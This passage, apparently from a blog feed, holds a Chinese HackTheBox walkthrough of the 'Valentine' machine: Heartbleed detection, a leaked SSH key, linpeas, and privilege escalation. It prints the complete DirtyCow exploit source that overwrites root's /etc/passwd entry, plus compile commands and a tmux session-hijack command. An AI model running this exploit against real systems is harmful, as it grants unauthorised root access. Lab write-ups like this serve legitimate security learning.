<p><img src="https://img-blog.csdnimg.cn/87f2253887984b2f8852806cd45909bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine</title>
    <url>/2021/12/24/Valentine/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°ä¸»æœºå¼€æ”¾äº†webæœåŠ¡å’ŒsshæœåŠ¡ï¼Œè¿™é‡Œå‘ç°äº†<code>valentine.htb</code>è¿™ä¸ªå­åŸŸï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒå¯¹åº”çš„è§£æåœ°å€æ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­å»<br><img src="https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>è®¿é—®å…¶webæœåŠ¡çš„æ—¶å€™ï¼Œå°±åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹ä»£ç æºç å•¥çš„éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯è¿™å¼ å›¾ç‰‡çš„å¿ƒè„åœ¨æ»´è¡€ï¼Œæˆ‘ä»¬ä¸éš¾çŒœåˆ°æ˜¯å¿ƒè„æ»´è¡€æ¼æ´å§<br><img src="https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬æƒ³ç”¨è„šæœ¬æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¿ƒè„æ»´è¡€æ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•æ£€æµ‹è¿™ä¸ªæ¼æ´ï¼Œä¸€ç§æ˜¯ä½¿ç”¨<code>heartbleed.py</code>è¿™ä¸ªpythonè„šæœ¬ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨nmapè‡ªå¸¦çš„nseè„šæœ¬æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬å‘ç°äº†ä¸€æ®µbase64çš„åŠ å¯†ä¿¡æ¯<code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>ï¼Œè§£ç å‘ç°æ˜æ–‡æ˜¯<code>heartbleedbelievethehype</code>ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå…ˆç•™ç€æˆ–è®¸åé¢æœ‰ç”¨ã€‚<br><img src="https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›®å‰æ¥è¯´æ²¡å•¥å¯åˆ©ç”¨çš„ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬è¿›è¡Œæ‰«ä¸€æ³¢ç›®å½•å§ã€‚å‘ç°äº†ä¸‰ä¸ªå¯è®¿é—®çš„ç›®å½•<br><img src="https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>devç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª<code>hype_key</code>å’Œ<code>notes.txt</code>è¿™ä¸¤ä¸ªæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰“å¼€hype_keyå‘ç°æ˜¯ä¸€å †åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œæˆ‘ä»¬è§£ç ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªç§é’¥<br><img src="https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å‘ç°ä¹‹å‰ä¸æ˜¯æœ‰ä¸€ä¸ªç±»ä¼¼å¯†ç çš„å­—ç¬¦ä¸²çš„å—ã€‚æˆ‘ä»¬å°è¯•ç™»é™†ï¼Œå¹¶ä¸”æˆåŠŸäº†ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°user.txtæ–‡ä»¶å†…å®¹<br><img src="https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿™é‡Œæˆ‘ä»¬å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä¸Šä¼ <code>linpeas.sh</code>è¿™ä¸ªè„šæœ¬åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œè¿™ä¸ªè„šæœ¬åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæ˜¯ä¸“é—¨é’ˆå¯¹Linuxææƒçš„ä¸€ä¸ªè„šæœ¬å·¥å…·ã€‚å®ƒæ˜¯ç”±Carlos Påˆ›å»ºçš„ï¼Œç›®çš„æ˜¯åˆ—ä¸¾åœ¨Linuxç³»ç»Ÿä¸Šæå‡ç‰¹æƒçš„æ‰€æœ‰å¯èƒ½æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œè¿™é‡Œæœ‰ä¸¤ç§ææƒçš„æ–¹æ³•ï¼Œä¸€ç§æ˜¯è„ç‰›ææƒï¼Œè¿™ä¸ªç®€å•å¿«æ·ï¼›å¦ä¸€ç§åˆ©ç”¨<code>tmux</code>è¿™ä¸ªåº”ç”¨ç¨‹åºæ¥å®æ–½ææƒã€‚</p>
<h3 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h3><p>è¿™é‡Œæˆ‘ä»¬å‘ç°è¿™ä¸ªLinuxç‰ˆæœ¬è¾ƒä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„ç‰›è¿›è¡Œææƒ<br><img src="https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨<code>exploit-db</code>ä¸Šå¯ä»¥å‘ç°åˆ©ç”¨çš„è„šæœ¬<br><img src="https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ˜¯æ•´ä¸ªè„šæœ¬çš„å†…å®¹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†è„ç‰›è„šæœ¬ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Š<br><img src="https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç¼–è¯‘å¹¶è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œæ–°è®¾ç½®çš„å¯†ç ä¸ºç©º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40389.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="tmuxææƒ"><a href="#tmuxææƒ" class="headerlink" title="tmuxææƒ"></a>tmuxææƒ</h2><p>é™¤äº†è„ç‰›ï¼Œæˆ‘ä»¬è¿˜å‘ç°ä»¥rootç”¨æˆ·è¿è¡Œçš„tmuxç¨‹åº<br><img src="https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¿è¡Œå‘½ä»¤ï¼Œå°±èƒ½å¤Ÿææƒåˆ°rootä¸Šäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å¿ƒè„æ»´è¡€</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry</title>
    <url>/2021/12/24/Jerry/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç›®æ ‡ä¸»æœºåªå¼€æ”¾äº†8080ç«¯å£ï¼Œè€Œä¸”ç‰ˆæœ¬è¿˜æ˜¯<code>7.0.88</code>çš„<br><img src="https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

